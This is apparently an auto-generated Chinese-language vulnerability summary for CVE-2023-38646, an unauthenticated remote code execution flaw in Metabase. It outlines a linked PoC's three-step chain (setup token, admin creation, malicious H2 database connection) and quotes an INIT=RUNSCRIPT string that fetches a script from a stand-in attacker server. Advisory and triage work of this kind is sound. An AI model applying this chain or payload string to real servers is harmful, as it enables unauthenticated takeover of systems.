## CVE-2023-38646-Metabase-RCE

**漏洞编号:** CVE-2023-38646

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Metabase

**危害等级:** 高危，无需身份验证即可远程执行任意代码

**影响版本:** < 0.46.6.1 和 Metabase Enterprise < 1.46.6.1

**利用条件:** 目标Metabase实例可以通过HTTP访问，且未进行身份验证配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38646 漏洞允许未经身份验证的攻击者在 Metabase 服务器上执行任意命令。根据漏洞信息和搜索结果，该漏洞利用了 Metabase 处理数据库连接的方式，特别是 H2 数据库。提供的 POC 脚本首先获取 setup token，然后创建一个管理员账户，最后添加一个恶意的数据库连接，该连接包含一个 H2 连接字符串，其中包含嵌入式命令，允许攻击者执行任意系统命令。连接字符串中的 `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` 指示 H2 从远程服务器执行 SQL 脚本，虽然 `poc.sql` 文件本身无害，但真正的攻击载荷嵌入在连接字符串本身，利用 `CREATE ALIAS` 创建一个Java函数,从而执行系统命令。\n\n**利用方式：**\n1. **获取 Setup Token:**  通过访问 `/api/session/properties` 获取初始设置所需的 token。\n2. **设置管理员账户:**  使用获取的 token，调用 `/api/setup` 创建一个新的管理员账户。这将创建一个具有必要权限的会话。\n3. **添加恶意数据库连接:** 使用新创建的管理员会话，调用 `/api/database` API 添加一个新的数据库。关键在于构造恶意的 H2 连接字符串，利用 `INIT` 参数执行远程 SQL 脚本，该脚本定义了一个 Java 函数来执行系统命令。为了绕过某些限制，通常利用 `CREATE ALIAS` 创建Java函数,从而执行系统命令。\n\n**有效性：** 提供的 PoC 代码是有效的，它能够利用该漏洞在 Metabase 实例上执行任意代码，如果目标实例的版本低于受影响的版本。\n\n**投毒风险：** 风险为10%，主要风险在于 `exploit.py` 文件中`YOUR_GITPOD_WORKSPACE_URL` 如果不是攻击者自己的服务器，存在被中间人攻击替换连接的风险. 虽然`poc.sql`目前仅仅是 `SELECT 1;`， 但是如果有人恶意修改`poc.sql`，则存在被投毒风险。 start.sh中的metabase.jar来源可能被篡改，存在被投毒风险。

**项目地址:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**漏洞详情:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)